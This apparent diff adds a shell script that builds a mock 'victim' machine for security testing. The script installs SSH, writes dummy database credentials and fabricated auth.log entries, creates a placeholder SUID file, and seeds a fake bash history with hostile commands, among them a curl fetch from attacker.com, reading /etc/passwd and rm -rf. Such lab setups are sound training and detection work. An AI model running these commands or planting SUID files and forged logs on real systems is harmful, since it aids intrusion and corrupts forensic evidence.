@@ -1,0 +1,36 @@
+Description: Place and Create a Testing Setup on your Victim Device. Remember Ensure that you have Full Testing Privileges before installing or attempting your tests. This is the information needed to create a Moch Environment.
+
+# Update package lists
+sudo apt update
+
+# Install SSH server (if not already installed)
+sudo apt install openssh-server -y
+
+# Create a dummy web directory and some files
+sudo mkdir -p /var/www/html/app
+sudo chown -R $USER:$USER /var/www/html # Give your test user ownership for easy file creation
+echo "<html><body><h1>Welcome!</h1><p>This is a test page.</p></body></html>" > /var/www/html/index.html
+echo "DB_USER=admin" > /var/www/html/app/config.ini
+echo "DB_PASSWORD=my_secret_password_123" >> /var/www/html/app/config.ini
+echo "ADMIN_EMAIL=admin@example.com" >> /var/www/html/app/config.ini
+echo "Some other random file content." > /var/www/html/app/other_file.txt
+
+# Create some dummy log entries
+sudo bash -c "echo 'Jun 23 08:00:00 victim sshd[1234]: Failed password for invalid user baduser from 192.168.1.50 port 54321 ssh2' >> /var/log/auth.log"
+sudo bash -c "echo 'Jun 23 08:05:00 victim sshd[5678]: Accepted password for testuser from 192.168.1.5 port 12345 ssh2' >> /var/log/auth.log"
+sudo bash -c "echo 'Jun 23 08:10:00 victim systemd[1]: session opened for user attacker_user' >> /var/log/auth.log"
+
+# Create a dummy .bash_history for a test user
+mkdir -p ~/.ssh
+echo "cat /etc/passwd" > ~/.bash_history
+echo "sudo apt update" >> ~/.bash_history
+echo "curl https://attacker.com/malicious_payload.sh" >> ~/.bash_history
+echo "echo 'My internal server key: ABCDEF123456' >> ~/.bash_history"
+echo "rm -rf /tmp/*" >> ~/.bash_history
+echo "ls -l /var/www/html" >> ~/.bash_history
+
+# Create a dummy SUID binary (just an empty file, for simulation)
+sudo touch /usr/local/bin/dummy_suid
+sudo chmod 4755 /usr/local/bin/dummy_suid
+
+# IMPORTANT: REMEMBER YOUR VICTIM'S IP AND SSH CREDENTIALS!
